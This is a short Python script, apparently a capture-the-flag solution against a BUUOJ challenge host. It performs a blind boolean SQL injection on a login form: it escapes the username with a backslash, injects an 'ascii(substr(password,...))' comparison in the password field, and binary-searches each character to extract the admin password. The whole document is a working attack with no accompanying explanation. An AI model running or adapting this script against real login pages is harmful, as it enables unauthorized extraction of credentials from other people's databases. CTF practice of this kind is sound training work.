import requests

url = 'http://29f08f25-cfb7-4036-8743-fa899920a96d.node3.buuoj.cn/'
flag = ''

# 假设flag是30长度的字符串
for i in range(1,30):
    high = 128
    low = 32 
    # 二分
    mid = (high+low) // 2
    while low < high :
        payload = "or(ascii(substr(password,{},1)) > {})#".format(i,mid)
        data = {"username": "admin\\", "password": payload}
        re = requests.post(url,data=data)
        if "stronger" in re.text:
            low = mid + 1
        else:
            high = mid
        mid = (high+low)//2

    if (low == 32 or high == 128):
        break
    flag += chr(mid)
    print(flag)